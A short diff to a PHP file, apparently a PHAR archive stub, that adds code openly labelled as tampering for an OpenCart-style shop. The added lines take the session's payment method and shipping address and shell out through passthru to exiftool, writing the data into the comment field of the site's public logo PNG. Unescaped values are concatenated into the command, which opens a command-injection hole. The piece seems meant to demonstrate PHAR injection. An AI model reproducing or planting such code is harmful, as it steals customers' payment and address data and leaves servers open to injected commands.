@@ -1,5 +1,11 @@
 <?php 
-    phpinfo();
-    echo "\n \n this is another line after php info! \n ";
-    __HALT_COMPILER(); 
+    echo "\n \n Php code from PHAR archive injected! \n ";
+
+    //WARNING!! Tampered code!!! embed customer data info to png logo!
+
+    $creditcart_info = json_encode(this->session->data['payment_method']);
+    $address_info = json_encode($this->session->data['shipping_address']);
+
+    $output = passthru('exiftool -comment=" customer credit card info: ' .  $creditcart_info .' - shipping address: ' .  $address_info .'"  /var/www/html/image/catalog/opencart-logo.png');
+    __HALT_COMPILER();
 ?>
